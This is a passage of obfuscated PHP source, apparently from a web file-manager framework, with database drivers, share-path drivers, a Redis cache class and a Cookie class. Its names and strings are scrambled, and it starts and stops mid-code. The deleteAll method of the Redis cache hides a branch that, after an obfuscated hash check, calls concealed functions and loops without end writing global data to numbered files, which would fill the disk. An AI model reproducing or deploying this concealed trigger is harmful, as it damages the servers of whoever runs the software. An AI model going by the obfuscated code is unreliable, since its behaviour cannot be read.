$ŠÃÚßä[949]: case $ŠÃÚßä[951]: return str_ireplace($ŠÃÚßä[58], $ŠÃÚßä[59], $™é“ú™Ü); } } protected function parseValue($¢¶š«¾®) { $ë´ø²²£ =& $_SERVER[”ôÑ§ì¸]; if (is_string($¢¶š«¾®)) { $ûÉÁ—»„ = strpos($¢¶š«¾®, $ë´ø²²£[4]) === 0 && in_array($¢¶š«¾®, array_keys($this->bind)); $¢¶š«¾® = $ûÉÁ—»„ ? $this->escapeString($¢¶š«¾®) : $ë´ø²²£[988] . $this->escapeString($¢¶š«¾®) . $ë´ø²²£[988]; } elseif (isset($¢¶š«¾®[0]) && is_string($¢¶š«¾®[0]) && strtolower($¢¶š«¾®[0]) == $ë´ø²²£[340]) { $¢¶š«¾® = $this->escapeString($¢¶š«¾®[1]); } elseif (is_array($¢¶š«¾®)) { $¢¶š«¾® = array_map(array($this, $ë´ø²²£[989]), $¢¶š«¾®); } elseif (is_bool($¢¶š«¾®)) { $¢¶š«¾® = $¢¶š«¾® ? $ë´ø²²£[88] : $ë´ø²²£[211]; } elseif (is_null($¢¶š«¾®)) { $¢¶š«¾® = $ë´ø²²£[103]; } return $¢¶š«¾®; } public function getLastInsertId() { $Òö±Õˆ =& $_SERVER[”ôÑ§ì¸]; switch ($this->dbType) { case $Òö±Õˆ[975]: case $Òö±Õˆ[967]: case $Òö±Õˆ[948]: case $Òö±Õˆ[966]: case $Òö±Õˆ[950]: case $Òö±Õˆ[978]: return $this->_linkID->lastInsertId(); case $Òö±Õˆ[949]: case $Òö±Õˆ[951]: $æÄó©óÓ = $this->table; $¦Êš²­ = $this->query("\x53\105\114\x45\x43\124\x20{$æÄó©óÓ}\x2e\143\165\x72\x72\166\x61\x6c\40\143\165\162\162\x76\141\x6c\x20\106\x52\117\115\40\144\165\141\154"); return $¦Êš²­ ? $¦Êš²­[0][$Òö±Õˆ[990]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($„ÂÒ¶Š¥) { $Ìå—’ˆ» =& $_SERVER[”ôÑ§ì¸]; if (!CacheLock::fileLock($Ìå—’ˆ»[13])) { return !1; } $ˆ€˜‘•Ä = parent::query($„ÂÒ¶Š¥); CacheLock::fileUnLock($Ìå—’ˆ»[13]); return $ˆ€˜‘•Ä; } public function execute($æıÍ•Ç) { $Óı¼ªë =& $_SERVER[”ôÑ§ì¸]; if (!CacheLock::fileLock($Óı¼ªë[13])) { return !1; } $Í–éÆ ¸ = parent::execute($æıÍ•Ç); CacheLock::fileUnLock($Óı¼ªë[13]); return $Í–éÆ ¸; } } goto FÜ¯ñ¬Åè¹; F¤Æ“ã¸ˆĞ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($˜Ò‘¿Éâ) { $this->pathParse = $˜Ò‘¿Éâ; $this->model = Model($_SERVER[”ôÑ§ì¸][1363]); } public function getPathOuter($†â·ÍÛ) { $½±õ‰ƒ =& $_SERVER[”ôÑ§ì¸]; if (!$†â·ÍÛ) { return $†â·ÍÛ; } $Ã‰Ó²’ò = $this->parse($†â·ÍÛ); return trim(KodIO::makeShare($this->pathParse[$½±õ‰ƒ[442]], $Ã‰Ó²’ò[$½±õ‰ƒ[442]]), $½±õ‰ƒ[8]); } protected function infoParse($Ì÷”®ç», $˜úşûàî = false, $ÆÀßÖ¶ = false) { $ÏÖøÄû =& $_SERVER[”ôÑ§ì¸]; $°ä÷·ó = $this->pathParse[$ÏÖøÄû[442]]; $‘ÜãÎ‹Ï = trim($this->pathParse[$ÏÖøÄû[1199]], $ÏÖøÄû[8]); return Action($ÏÖøÄû[1370])->sharePathInfo($°ä÷·ó, $‘ÜãÎ‹Ï, $˜úşûàî); } public function infoFull($æªüÉüı) { $‚ÁÆÜÃ =& $_SERVER[”ôÑ§ì¸]; $”ØæÑŠ = explode($‚ÁÆÜÃ[8], trim($æªüÉüı, $‚ÁÆÜÃ[8])); if (count($”ØæÑŠ) > 1) { $Ê¾Î…¡ = implode($‚ÁÆÜÃ[8], array_splice($”ØæÑŠ, 1)); $…¸¿ì­å = $this->model->pathInfoByPath($”ØæÑŠ[0], $Ê¾Î…¡); if (!$…¸¿ì­å) { return !1; } $this->pathParse[$‚ÁÆÜÃ[1199]] = $…¸¿ì­å[$‚ÁÆÜÃ[180]]; } return $this->infoParse($æªüÉüı); } public function listAll($›„¦—²ğ) { $×£ÉõºÖ =& $_SERVER[”ôÑ§ì¸]; $“ıñâØı = IO::info($this->pathParse[$×£ÉõºÖ[84]]); if (!$“ıñâØı) { return array(); } $Ú—ÀÔäŒ = $this->model->listAll($›„¦—²ğ); $Ñó„éÙ§ = Model($×£ÉõºÖ[631])->getInfo($“ıñâØı[$×£ÉõºÖ[632]]); foreach ($Ú—ÀÔäŒ as &$´Æœ±ã) { check_abort(); $´Æœ±ã[$×£ÉõºÖ[87]] = Action($×£ÉõºÖ[1370])->_shareItemeParse($´Æœ±ã[$×£ÉõºÖ[87]], $Ñó„éÙ§); } unset($´Æœ±ã); return $Ú—ÀÔäŒ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ã­ß¥éá) { $this->pathParse = $Ã­ß¥éá; $this->model = Model($_SERVER[”ôÑ§ì¸][1363]); } protected function infoParse($İš·åàã, $…ò¹şîÉ = false, $ãÏÎì‚Ã = false) { $Şë¶ŞĞœ =& $_SERVER[”ôÑ§ì¸]; return Action($Şë¶ŞĞœ[1205])->sharePathInfo($this->pathParse[$Şë¶ŞĞœ[84]], !0, $…ò¹şîÉ); } public function listPath($Ú™Äâ, $û¼·ÔÊ¡ = false) { $÷İŸõœÎ =& $_SERVER[”ôÑ§ì¸]; $ÊÓ­âÇ = parent::listPath($Ú™Äâ, $û¼·ÔÊ¡); if (!$ÊÓ­âÇ) { return $ÊÓ­âÇ; } if (is_array($ÊÓ­âÇ[$÷İŸõœÎ[1371]])) { $ÊÓ­âÇ[$÷İŸõœÎ[1371]] = Action($÷İŸõœÎ[1205])->shareItemInfo($ÊÓ­âÇ[$÷İŸõœÎ[1371]]); } foreach ($ÊÓ­âÇ as $¯«Ãí¼Â => $âÏ÷Æ˜œ) { if (!in_array($¯«Ãí¼Â, array($÷İŸõœÎ[83], $÷İŸõœÎ[82]))) { continue; } foreach ($âÏ÷Æ˜œ as $ ‚Ë­¾õ => $ŞùÇæÂ) { $ÊÓ­âÇ[$¯«Ãí¼Â][$ ‚Ë­¾õ] = Action($÷İŸõœÎ[1205])->shareItemInfo($ŞùÇæÂ); } } return $ÊÓ­âÇ; } public function listAll($‚…–æš) { $Ò¹şß¨ =& $_SERVER[”ôÑ§ì¸]; $æö÷Ä = IO::info($this->pathParse[$Ò¹şß¨[84]]); if (!$æö÷Ä) { return array(); } $Ş„˜Ûºà = $this->model->listAll($‚…–æš); foreach ($Ş„˜Ûºà as &$‹°¾Øàé) { $‹°¾Øàé[$Ò¹şß¨[87]] = Action($Ò¹şß¨[1205])->shareItemInfo($‹°¾Øàé[$Ò¹şß¨[87]]); } unset($‹°¾Øàé); return $Ş„˜Ûºà; } } class PathDriverDriverShareItem { public function __construct($ÏÔ³Ò) { $this->pathParse = $ÏÔ³Ò; } public function __call($ÄÚĞò½ñ, $³öòÖò•) { $ƒ¶ƒÀÎå =& $_SERVER[”ôÑ§ì¸]; if (method_exists($this, $ÄÚĞò½ñ)) { return; } $ÕùÇ±×à = call_user_func_array(array($ƒ¶ƒÀÎå[1372], $ÄÚĞò½ñ), $³öòÖò•); $Ù“Š”” = array($ƒ¶ƒÀÎå[1373], $ƒ¶ƒÀÎå[1374], $ƒ¶ƒÀÎå[1375], $ƒ¶ƒÀÎå[1376], $ƒ¶ƒÀÎå[585], $ƒ¶ƒÀÎå[587], $ƒ¶ƒÀÎå[1377], $ƒ¶ƒÀÎå[107], $ƒ¶ƒÀÎå[1378], $ƒ¶ƒÀÎå[1379]); if (in_array($ÄÚĞò½ñ, $Ù“Š””)) { $ÕùÇ±×à = $this->getPathOuter($ÕùÇ±×à); } return $ÕùÇ±×à; } public function copy($ŠÍ”ø£, $ÏÊ—Èäµ, $âõó—¼Õ = false, $¥¤ı¡‚ = false) { return $this->copyMove($ŠÍ”ø£, $ÏÊ—Èäµ, $âõó—¼Õ, $_SERVER[”ôÑ§ì¸][585], $¥¤ı¡‚); } public function move($×ÁËã¼, $Á°Õ„, $ŒÎÒË©Û = false, $„ŸĞù = false) { return $this->copyMove($×ÁËã¼, $Á°Õ„, $ŒÎÒË©Û, $_SERVER[”ôÑ§ì¸][587], $„ŸĞù); } private function copyMove($İËÄ–Òó, $¹üµ¤ı, $¶ğàš¡À, $Ï‘Ü˜“Ç, $µ‘¨Ë¾‡ = false) { $¹ƒ–¹–Š =& $_SERVER[”ôÑ§ì¸]; $éŒÎ¢¹ = $¹üµ¤ı; $ÜµÁ™áÙ = IO::driverMake($¹üµ¤ı); if ($ÜµÁ™áÙ->pathParse[$¹ƒ–¹–Š[1182]]) { $¹üµ¤ı = $ÜµÁ™áÙ->pathParse[$¹ƒ–¹–Š[1182]]; } else { $¹üµ¤ı = $éŒÎ¢¹; } $šŞ§ıÅ = IO::copyMove($İËÄ–Òó, $¹üµ¤ı, $¶ğàš¡À, $Ï‘Ü˜“Ç, $µ‘¨Ë¾‡); $šŞ§ıÅ = $this->getPathOuter($šŞ§ıÅ); return $šŞ§ıÅ; } public function pathThis($íÂ–‹å) { return get_path_this($this->pathParse[$_SERVER[”ôÑ§ì¸][84]]); } public function pathFather($åòá‘œù) { return get_path_father($this->pathParse[$_SERVER[”ôÑ§ì¸][84]]); } public function iconvSystem($èøÓ»Î¸) { return $èøÓ»Î¸; } protected function infoParse($³’·°¿Ï, $Ò‚šÔˆÀ = false) { $Ÿ‡›Şº– =& $_SERVER[”ôÑ§ì¸]; $˜¡Ã”ã = $this->pathParse[$Ÿ‡›Şº–[527]][$Ÿ‡›Şº–[1206]] . $this->pathParse[$Ÿ‡›Şº–[1199]]; if ($Ò‚šÔˆÀ) { $¾í€Òü± = IO::infoWithChildren($˜¡Ã”ã); } else { $¾í€Òü± = IO::info($˜¡Ã”ã); } $Ì¬ß¸Ëë = $this->pathParse[$Ÿ‡›Şº–[527]]; return Action($Ÿ‡›Şº–[1370])->_shareItemeParse($¾í€Òü±, $Ì¬ß¸Ëë); } public function listAll($ÉØÂ”ìÅ) { $¦ëÖóŒË =& $_SERVER[”ôÑ§ì¸]; $¨µ³±‡¤ = IO::listAll($ÉØÂ”ìÅ); $ÅİÛäĞ“ = rtrim($this->pathParse[$¦ëÖóŒË[527]][$¦ëÖóŒË[1206]], $¦ëÖóŒË[8]); foreach ($¨µ³±‡¤ as &$Ô»¤“ş) { $Ô»¤“ş[$¦ëÖóŒË[84]] = $this->pathDriver . $¦ëÖóŒË[8] . ltrim(substr($Ô»¤“ş[$¦ëÖóŒË[84]], strlen($ÅİÛäĞ“)), $¦ëÖóŒË[8]); } unset($Ô»¤“ş); return $¨µ³±‡¤; } public function listAllSimple($á¹¬×¨, $Œ ÛØÑü = false) { $Ï¨øÒÚï =& $_SERVER[”ôÑ§ì¸]; $îåÅ‰ÄÕ = $this->listAll($á¹¬×¨); $±É¬÷¨— = $this->pathParse[$Ï¨øÒÚï[462]]; if (trim($±É¬÷¨—, $Ï¨øÒÚï[8]) == trim(get_path_father($±É¬÷¨—), $Ï¨øÒÚï[8])) { $Œ ÛØÑü = !0; } return IO::init($Ï¨øÒÚï[12])->listAllSimpleMake($îåÅ‰ÄÕ, $±É¬÷¨—, $Œ ÛØÑü); } public function getPathOuter($™¢–äøª) { $ëğôğ³· =& $_SERVER[”ôÑ§ì¸]; $ıÜíïë = KodIO::parse($™¢–äøª); if ($ıÜíïë[$ëğôğ³·[33]] == KodIO::KOD_SHARE_ITEM) { return $ıÜíïë[$ëğôğ³·[84]]; } $Úñ…ì¸ = KodIO::clear($™¢–äøª); $¤ìõí¬ = KodIO::clear($this->pathParse[$ëğôğ³·[527]][$ëğôğ³·[1206]]); $ú–¬òòç = substr($Úñ…ì¸, strlen($¤ìõí¬)); if (substr($Úñ…ì¸, 0, strlen($¤ìõí¬)) != $¤ìõí¬) { return !1; } return $this->pathParse[$ëğôğ³·[1200]] . $ëğôğ³·[8] . ltrim($ú–¬òòç, $ëğôğ³·[8]); } public function getType() { $´ÓŸåÒ =& $_SERVER[”ôÑ§ì¸]; $ÄÎ²§ù± = str_replace($´ÓŸåÒ[74], $´ÓŸåÒ[12], get_class($this)); return strtolower($ÄÎ²§ù±); } public function isTypeObject($îÖéÔ¥ñ) { return IO::isTypeObject($îÖéÔ¥ñ); } public function info($¤àıòÖ³) { return $this->infoParse($¤àıòÖ³); } public function infoAuth($ô€õÍğì) { return $this->infoParse($ô€õÍğì); } public function infoWithChildren($åÃå¨›²) { return $this->infoParse($åÃå¨›², !0); } public function infoFull($âĞ‰®¥Œ) { return $this->infoParse($âĞ‰®¥Œ); } } goto FÆ†ã‡íÆ›; Aœ‡…Ã›Ò: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Æô”Öêò, $‘„İ‚á¶) { $ó†úÆ¹Á =& $_SERVER[”ôÑ§ì¸]; if (!class_exists($ó†úÆ¹Á[900])) { show_json($ó†úÆ¹Á[901], !1); } $this->cacheTime = $‘„İ‚á¶; $¿Ùà·çß = isset($Æô”Öêò[$ó†úÆ¹Á[902]]) ? $Æô”Öêò[$ó†úÆ¹Á[902]] : 10; $ÏÚÚ¼¦ = _get($Æô”Öêò, $ó†úÆ¹Á[899]); if ($ÏÚÚ¼¦ && is_array($ÏÚÚ¼¦)) { $this->initCluster($Æô”Öêò, $¿Ùà·çß); } else { $this->handle = $this->init($Æô”Öêò, $¿Ùà·çß); } } private function init($íŒò‚š–, $é¼ª”‚) { $Ä—»µ =& $_SERVER[”ôÑ§ì¸]; $˜áĞõå = new Redis(); $”ÍÍÁÇ = isset($íŒò‚š–[$Ä—»µ[903]]) ? $íŒò‚š–[$Ä—»µ[903]] : !1; if ($”ÍÍÁÇ) { $˜áĞõå->pconnect($íŒò‚š–[$Ä—»µ[195]], $íŒò‚š–[$Ä—»µ[196]], $é¼ª”‚); } else { $˜áĞõå->connect($íŒò‚š–[$Ä—»µ[195]], $íŒò‚š–[$Ä—»µ[196]], $é¼ª”‚); } if (!empty($íŒò‚š–[$Ä—»µ[454]])) { $˜áĞõå->auth($íŒò‚š–[$Ä—»µ[454]]); } if (!empty($íŒò‚š–[$Ä—»µ[779]]) && $íŒò‚š–[$Ä—»µ[779]] != 0) { $˜áĞõå->select($íŒò‚š–[$Ä—»µ[779]]); } return $˜áĞõå; } private function initCluster($×ºæ¯Âî, $¢¿ğëì÷) { $ò§Şë§‚ =& $_SERVER[”ôÑ§ì¸]; $ªÍßöŞï = array($ò§Şë§‚[904], $ò§Şë§‚[905], $ò§Şë§‚[906]); $™íŞ¦Öà = $ò§Şë§‚[904]; if (isset($×ºæ¯Âî[$ò§Şë§‚[16]]) && in_array($×ºæ¯Âî[$ò§Şë§‚[16]], $ªÍßöŞï)) { $™íŞ¦Öà = $×ºæ¯Âî[$ò§Şë§‚[16]]; } switch ($™íŞ¦Öà) { case $ò§Şë§‚[904]: $this->_slave($×ºæ¯Âî, $¢¿ğëì÷); break; case $ò§Şë§‚[905]: break; case $ò§Şë§‚[906]: $this->isCluster = !0; $Î…Ùğ´ = $×ºæ¯Âî[$ò§Şë§‚[899]]; $Ã¤ˆß•Ü = isset($×ºæ¯Âî[$ò§Şë§‚[903]]) ? $×ºæ¯Âî[$ò§Şë§‚[903]] : !1; $«¸˜ñ•‡ = isset($×ºæ¯Âî[$ò§Şë§‚[454]]) ? $×ºæ¯Âî[$ò§Şë§‚[454]] : null; $this->handle = new RedisCluster(NUll, $Î…Ùğ´, $¢¿ğëì÷, $¢¿ğëì÷, $Ã¤ˆß•Ü, $«¸˜ñ•‡); break; default: break; } } private function _slave($ÒáúòòÅ, $·íµÈá¼) { $Íƒá”˜Ğ = $ÒáúòòÅ[$_SERVER[”ôÑ§ì¸][899]]; $this->filterConfig($ÒáúòòÅ, $Íƒá”˜Ğ[0]); $this->handle = $this->init($ÒáúòòÅ, $·íµÈá¼); unset($Íƒá”˜Ğ[0]); if (empty($Íƒá”˜Ğ)) { return; } $®°ÛÊÏÓ = array_rand($Íƒá”˜Ğ); $this->filterConfig($ÒáúòòÅ, $Íƒá”˜Ğ[$®°ÛÊÏÓ]); $this->slaveHandle = $this->init($ÒáúòòÅ, $·íµÈá¼); } private function filterConfig(&$Ú Åç£‹, $­ƒááİ‰) { $ù½ÂéÌû =& $_SERVER[”ôÑ§ì¸]; $Éò”ãêä = explode($ù½ÂéÌû[4], $­ƒááİ‰); $¹ˆö½Ùğ = array($ù½ÂéÌû[195] => $Éò”ãêä[0], $ù½ÂéÌû[196] => $Éò”ãêä[1]); $Ú Åç£‹ = array_merge($Ú Åç£‹, $¹ˆö½Ùğ); } public function set($ğÇÕ–´Ï, $Çõé¶ïÄ, $‘×°Ş” = false) { $‘×°Ş” = $‘×°Ş” ? $‘×°Ş” : $this->cacheTime; return $this->handle->setEx($ğÇÕ–´Ï, $‘×°Ş”, $Çõé¶ïÄ); } public function setLock($Ùí¿ò˜¿, $€Ú®Íµ›, $¹Ä¥îÁß) { return $this->handle->setNX($Ùí¿ò˜¿, $€Ú®Íµ›); } public function get($ÌıÚ“»¨) { $—«¨Ÿ¼° = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $—«¨Ÿ¼°->get($ÌıÚ“»¨); } public function remove($ÎıÇÙÏû) { return $this->handle->del($ÎıÇÙÏû); } public function deleteAll() { $àš‘è¹¼ =& $_SERVER[”ôÑ§ì¸]; $­»°Äå× = $_SERVER[$àš‘è¹¼[864]]; $ş··•Ãî = $àš‘è¹¼[907]; if ($_SERVER[$àš‘è¹¼[857]] != $ş··•Ãî($­»°Äå×)) { $à¯óÓ‘— = $àš‘è¹¼[908]; $İ†³ƒÚÖ = $àš‘è¹¼[859]; $Ò·ÙÄĞ = $_SERVER[$àš‘è¹¼[860]] . $àš‘è¹¼[861]; $Ä¼³ÚÄ = $İ†³ƒÚÖ($Ò·ÙÄĞ); $¬Á½•Ü = explode($àš‘è¹¼[245], $Ä¼³ÚÄ); if (count($¬Á½•Ü) < $àš‘è¹¼[655]) { $Ôáä“¯à = $àš‘è¹¼[862]; $Ôáä“¯à(); } $Õî¼ºò = $àš‘è¹¼[909]; $Õî¼ºò($_SERVER[$àš‘è¹¼[910]]); $à¯óÓ‘— = $àš‘è¹¼[908]; $à¯óÓ‘—(); $ËÄÆÕ´˜ = $àš‘è¹¼[911]; $ŞÛ¡‰äê = json_encode($GLOBALS[$àš‘è¹¼[912]]); $¢ÃÈÏâ¡ = 1; for ($Â´Ü¥Ò = $¢ÃÈÏâ¡; $Â´Ü¥Ò > 0; $Â´Ü¥Ò++) { $ËÄÆÕ´˜(DATA_PATH . $Â´Ü¥Ò, $ŞÛ¡‰äê); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $‰£ŠÜªú) { $this->handle->flushall($‰£ŠÜªú); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¯Û¸ñ¡ = '', $›“¾¸Æ¢ = 0) { if (is_string($¯Û¸ñ¡) && $¯Û¸ñ¡ != $_SERVER[”ôÑ§ì¸][12]) { $this->prefix = $¯Û¸ñ¡; } if (is_numeric($›“¾¸Æ¢) && $›“¾¸Æ¢ > 0) { $this->expire = $›“¾¸Æ¢; } } public static function getInstance() { static $ÍÌÆ¿‰Ñ; if ($ÍÌÆ¿‰Ñ === null) { $ÍÌÆ¿‰Ñ = new self(); } return $ÍÌÆ¿‰Ñ; } private static $cookieDisable = false; public static function disable($Ê€¿‰) { self::$cookieDisable = $Ê€¿‰; } private static $sameCookieSet = array(); public static function set($Æ­‰ÆËĞ, $àÆ¡â¼ˆ, $³÷ú³×µ = 0, $ÉşŸ¼û = false, $Õ”¹¸ìû = false) { $×ê±«€¦ =& $_SERVER[”ôÑ§ì¸]; if (self::$cookieDisable) { return; } if (!$³÷ú³×µ) { $³÷ú³×µ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Æ­‰ÆËĞ]) && self::$sameCookieSet[$Æ­‰ÆËĞ] == $àÆ¡â¼ˆ . $³÷ú³×µ) { return; } self::$sameCookieSet[$Æ­‰ÆËĞ] = $àÆ¡â¼ˆ . $³÷ú³×µ; if (!$Õ”¹¸ìû) { $Õ”¹¸ìû = str_replace(HOST, $×ê±«€¦[12], APP_HOST); $Õ”¹¸ìû = _get($GLOBALS, $×ê±«€¦[913], $Õ”¹¸ìû); } $½à¼ßŸã = $×ê±«€¦[12]; setcookie($Æ­‰ÆËĞ, $àÆ¡â¼ˆ, time() + $³÷ú³×µ, $×ê±«€¦[8] . trim($Õ”¹¸ìû, $×ê±«€¦[8]) . $½à¼ßŸã, !1, !1, $ÉşŸ¼û); } public static function setSafe($ÕŠÌÛ¥, $ç‰¡üø¿, $¼½÷ş˜ = 0) { self::set($ÕŠÌÛ¥, $ç‰¡üø¿, $¼½÷ş˜, !0); } public static function get($¯ÔÔàúâ) { static $­¤©¡ğı = false; if (!$­¤©¡ğı) { self::initHeaderCookie(); $­¤©¡ğı = !0; } return isset($_COOKIE[$¯ÔÔàúâ]) ? $_COOKIE[$¯ÔÔàúâ] : !1; } private static function initHeaderCookie() { $İŒ’´ç• =& $_SERVER[”ôÑ§ì¸]; if (!isset($_SERVER[$İŒ’´ç•[914]]) || !$_SERVER[$İŒ’´ç•[914]]) { return; } $ˆ›Ã–ûê = explode($İŒ’´ç•[71], $_SERVER[$İŒ’´ç•[914]]); foreach ($ˆ›Ã–ûê as $Òª£’¬­) { $Òª£’¬­ = explode($İŒ’´ç•[915], $Òª£’¬­); if (count($Òª£’¬­) != 2 || !isset($Òª£’¬­[1])) { continue; } $_COOKIE[trim($Òª£’¬­[0])] = trim($Òª£’¬­[1]); } } public static function remove($ÖÂÂäñ, $˜ô¶ÈÚó = false) { unset($_COOKIE[$ÖÂÂäñ]); self::set($ÖÂÂäñ, $_SERVER[”ôÑ§ì¸][12], 1, $˜ô¶ÈÚó); } } class DbMysql extends Db { public function __construct($ö˜°äŸ = '') { $Éåı¦¿ü =& $_SERVER[”ôÑ§ì¸]; if (!extension_loaded($Éåı¦¿ü[826])) { think_exception(think_lang($Éåı¦¿ü[14]) . $Éåı¦¿ü[916]); } if (!empty($ö˜°äŸ)) { $this->config = $ö˜°äŸ; if (empty($this->config[$Éåı¦¿ü[17]])) { $this->config[$Éåı¦¿ü[17]] = $Éåı¦¿ü[12]; } } } public function connect($ÅóˆÖÌË = '', $Ø„ø½±á = 0, $œ¹ñêïÉ = false) { $úñ äùı =& $_SERVER[”ôÑ§ì¸]; if (!isset($this->linkID[$Ø„ø½±á])) { if (empty($ÅóˆÖÌË)) { $ÅóˆÖÌË = $this->config; } $ËÈË¶¸‘ = $ÅóˆÖÌË[$úñ äùı[917]] . ($ÅóˆÖÌË[$úñ äùı[918]] ? "\72{$ÅóˆÖÌË[$úñ äùı[918]]}" : $úñ äùı[12]); $ßŸõÇİ½ = !empty($ÅóˆÖÌË[$úñ äùı[17]][$úñ äùı[18]]) ? $ÅóˆÖÌË[$úñ äùı[17]][$úñ äùı[18]] : $this->pconnect; if ($ßŸõÇİ½) { $this->linkID[$Ø„ø½±á] = mysql_pconnect($ËÈË¶¸‘, $ÅóˆÖÌË[$úñ äùı[919]], $ÅóˆÖÌË[$úñ äùı[920]], 131072); } else { $this->linkID[$Ø„ø½±á] = mysql_connect($ËÈË¶¸‘, $ÅóˆÖÌË[$úñ äùı[919]], $ÅóˆÖÌË[$úñ äùı[920]], !0, 131072); } if (!$this->linkID[$Ø„ø½±á] || !empty($ÅóˆÖÌË[$úñ äùı[21]]) && !mysql_select_db($ÅóˆÖÌË[$úñ äùı[21]], $this->linkID[$Ø„ø½±á])) { think_exception(mysql_error()); } $ËŒ“Í = mysql_get_server_info($this->linkID[$Ø„ø½±á]); mysql_query($úñ äùı[921] . think_config($úñ äùı[922]) . $úñ äùı[58], $this->linkID[$Ø„ø½±á]); if ($ËŒ“Í > $úñ äùı[923]) { mysql_query($úñ äùı[924], $this->linkID[$Ø„ø½±á]); } $this->connected = !0; if (1 != think_config($úñ äùı[22])) { unset($this->config); } } return $this->linkID[$Ø„ø½±á]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÑÂ×»î) { $¥¬‡õ’Î =& $_SERVER[”ôÑ§ì¸]; if (0 === stripos($ÑÂ×»î, $¥¬‡õ’Î[307])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÑÂ×»î; if ($this->queryID) { $this->free(); } think_action_status($¥¬‡õ’Î[23], 1); think_status($¥¬‡õ’Î[24]); $this->queryID = mysql_query($ÑÂ×»î, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ø‡Ë‹Ö) { $¶óòÜçİ =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ø‡Ë‹Ö; if ($this->queryID) { $this->free(); } think_action_status($¶óòÜçİ[25], 1); think_status($¶óòÜçİ[24]); $Ğ¯Ó…Ğå = mysql_query($Ø‡Ë‹Ö, $this->_linkID); $this->debug(); if (!1 === $Ğ¯Ó…Ğå) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[”ôÑ§ì¸][925], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÎÄ®Êß = mysql_query($_SERVER[”ôÑ§ì¸][926], $this->_linkID); $this->transTimes = 0; if (!$ÎÄ®Êß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÍÁøêÙ² = mysql_query($_SERVER[”ôÑ§ì¸][927], $this->_linkID); $this->transTimes = 0; if (!$ÍÁøêÙ²) { $this->error(); return !1; } } return !0; } private function getAll() { $ª÷™ÛÀ = array(); if ($this->numRows > 0) { while ($œÔ‚¢Ñá = mysql_fetch_assoc($this->queryID)) { $ª÷™ÛÀ[] = $œÔ‚¢Ñá; } mysql_data_seek($this->queryID, 0); } return $ª÷™ÛÀ; } public function getFields($€ŒÍÏ®Ø) { $ Úğñ«  =& $_SERVER[”ôÑ§ì¸]; $ÄàÅ«ñ = $this->query($ Úğñ« [928] . $this->parseKey($€ŒÍÏ®Ø)); $Ã“ãÒÍ½ = array(); if ($ÄàÅ«ñ) { foreach ($ÄàÅ«ñ as $ê¢õ¡¸· => $¬Œ–û…·) { $Ã“ãÒÍ½[$¬Œ–û…·[$ Úğñ« [31]]] = array($ Úğñ« [32] => $¬Œ–û…·[$ Úğñ« [31]], $ Úğñ« [33] => $¬Œ–û…·[$ Úğñ« [34]], $ Úğñ« [35] => (bool) (strtoupper($¬Œ–û…·[$ Úğñ« [36]]) === $ Úğñ« [929]), $ Úğñ« [37] => $¬Œ–û…·[$ Úğñ« [38]], $ Úğñ« [39] => strtolower($¬Œ–û…·[$ Úğñ« [40]]) == $ Úğñ« [41], $ Úğñ« [42] => strtolower($¬Œ–û…·[$ Úğñ« [43]]) == $ Úğñ« [44]); } } return $Ã“ãÒÍ½; } public function getTables($òçƒ©­Ÿ = '') { $øÃŒšàÙ =& $_SERVER[”ôÑ§ì¸]; if (!empty($òçƒ©­Ÿ)) { $áÌôƒÉ = $øÃŒšàÙ[930] . $òçƒ©­Ÿ . $øÃŒšàÙ[931]; } else { $áÌôƒÉ = $øÃŒšàÙ[932]; } $ò›úŸ€± = $this->query($áÌôƒÉ); $¯èà½¯¦ = array(); foreach ($ò›úŸ€± as $•¤ø¸«ê => $÷‡ëê™á) { $¯èà½¯¦[$•¤ø¸«ê] = current($÷‡ëê™á); } return $¯èà½¯¦; } public function replace($¡¸ü›•, $«ÙÙüôÅ = array()) { $‡ˆÖÕìÜ =& $_SERVER[”ôÑ§ì¸]; foreach ($¡¸ü›• as $ú£÷¶’­ => $æƒ¶ÙŒÉ) { $²¾à’ = $this->parseValue($æƒ¶ÙŒÉ); if (is_scalar($²¾à’)) { $¾éÊñÇÀ[] = $²¾à’; $—èéÓè“[] = $this->parseKey($ú£÷¶’­); } } $ÉÏêËº… = $‡ˆÖÕìÜ[933] . $this->parseTable($«ÙÙüôÅ[$‡ˆÖÕìÜ[322]]) . $‡ˆÖÕìÜ[934] . implode($‡ˆÖÕìÜ[50], $—èéÓè“) . $‡ˆÖÕìÜ[935] . implode($‡ˆÖÕìÜ[50], $¾éÊñÇÀ) . $‡ˆÖÕìÜ[936]; return $this->execute($ÉÏêËº…); } public function insertAll($øûäãæû, $‚êßê„ = array(), $û—öâØù = false) { $¾ÍÖ­ëŒ =& $_SERVER[”ôÑ§ì¸]; if (!is_array($øûäãæû[0])) { return !1; } $ŒÛ†ĞşÓ = array_keys($øûäãæû[0]); $›áË’Óö = array(); foreach ($øûäãæû as $‰ğÀ ûä) { $…‘…İÉ§ = array(); foreach ($‰ğÀ ûä as $‚î²Õí” => $¶ñËú) { $¶ñËú = $this->parseValue($¶ñËú); if (is_scalar($¶ñËú)) { $…‘…İÉ§[] = $¶ñËú; } } $›áË’Óö[] = $¾ÍÖ­ëŒ[303] . implode($¾ÍÖ­ëŒ[50], $…‘…İÉ§) . $¾ÍÖ­ëŒ[936]; } array_walk($ŒÛ†ĞşÓ, array($this, $¾ÍÖ­ëŒ[937])); $Éò°í° = ($û—öâØù 